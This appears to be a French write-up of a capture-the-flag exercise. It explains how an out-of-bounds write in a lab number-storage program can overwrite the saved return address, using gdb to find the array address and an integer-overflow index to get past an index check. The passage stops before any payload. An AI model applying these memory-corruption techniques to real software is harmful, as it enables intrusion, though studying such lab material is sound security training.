
Dans cet exercice le programme est un terminal qui accepte 3 commandes `store` `read` et `quit`.
C'est un programme qui stocke des nombre.
Via ces commandes, on peut inserer et lire des elements dans le tableau.

Quand on regarde le code decompile, on voit qu'on peut remplir des index qui sont bien au dela de la limite du tableau.

Notre objectif va donc etre d'overwrite la valeur de return eip.

On commence par trouver l'adresse du debut du tableau.
Cette adresse est donnee en argument a la fonction store_number.
On peut mettre un breakpoint avant l'appel de cette fonction et ensuite afficher l'element 8 octets apres ebp pour trouver cette adresse.
4 octets apres epb c'est saved eip, 8 octets apres c'est le premier argument.
```bash
(gdb) b store_number
Breakpoint 1 at 0x8048636
(gdb) run
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store

Breakpoint 1, 0x08048636 in store_number ()
(gdb) x/x $ebp+8
0xffffd530:     0xffffd554
```

maintenant qu'on sait a quel index ecrire dans le tableau, on doit faire un peu de reverse engineering.
notre index ne doit pas etre un multiple de 3, or on veut ecrire a l'index 114, c'est un multiple de 3.

On va donc passer par un int overflow pour remplir l'index 114 du tableau.
Notre index est multiplie par 4 au moment du stockage, c'est pour laisser 4 octets a chaque emplacements du tableau.
Donc on cherche un nombre x qui multiplie par 4 donne la taille max d'un int + (114 * 4).
```maths
x = uint_max / 4 + 114
x = 4294967296 / 4 + 114
x = 1073741938
```